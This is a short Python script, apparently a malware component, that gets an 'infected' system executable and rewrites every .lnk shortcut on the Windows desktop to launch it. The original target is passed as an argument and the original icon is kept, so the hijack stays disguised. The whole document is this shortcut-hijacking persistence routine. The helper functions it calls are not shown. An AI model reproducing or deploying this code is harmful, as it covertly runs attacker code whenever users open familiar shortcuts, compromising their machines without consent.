import os
import glob
import winutils

from win32com.client import Dispatch

binary = winutils.infect_system_exe()
desktop = os.path.join(os.getenv('userprofile'), 'Desktop')
shorcuts = glob.glob(os.path.join(desktop, '*.lnk'))

for sc in shorcuts:
    shortcut = winutils.read_shorcut(sc)
    winutils.create_shortcut(sc, binary,
                            arguments=shortcut.Targetpath,
                            working_dir=os.path.dirname(shortcut.Targetpath),
                            icon=shortcut.Targetpath)
